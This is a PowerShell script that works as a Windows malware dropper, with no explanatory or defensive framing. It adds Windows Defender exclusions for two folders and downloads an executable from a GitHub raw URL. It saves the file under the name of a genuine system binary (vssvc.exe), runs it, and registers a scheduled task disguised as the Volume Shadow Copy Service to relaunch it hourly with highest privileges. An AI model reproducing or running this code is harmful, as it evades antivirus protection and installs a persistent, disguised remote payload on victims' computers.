# Change directory
cd C:\Windows\apppatch

# Ensure Windows Defender service is running
if ((Get-Service -Name WinDefend).Status -ne 'Running') {
    Start-Service -Name WinDefend
    Start-Sleep -Seconds 5
}

# Add exclusions to Windows Defender
try {
    Add-MpPreference -ExclusionPath C:\Windows\apppatch -ErrorAction Stop
    Add-MpPreference -ExclusionPath C:\ProgramData\Microsoft -ErrorAction Stop
} catch {
    Write-Error "Failed to add exclusions: $_"
}

# Pause execution for 1 second
Start-Sleep -Seconds 1

# Download executable
$url = "https://github.com/abyasabazla/test/raw/main/New%20folder/testt.exe"
$outputFilePath = "C:\ProgramData\Microsoft\vssvc.exe"
try {
    Invoke-WebRequest -Uri $url -OutFile $outputFilePath -ErrorAction Stop
} catch {
    Write-Error "Failed to download file: $_"
}

# Execute the downloaded file
Start-Process -FilePath $outputFilePath

# Create a scheduled task
try {
    schtasks /create /tn "\Volume Shadow Copy Service" /tr "$outputFilePath" /st 00:00 /du 9999:59 /sc once /ri 60 /rl HIGHEST /f
} catch {
    Write-Error "Failed to create scheduled task: $_"
}

# Print message
Write-Output "Attempt."
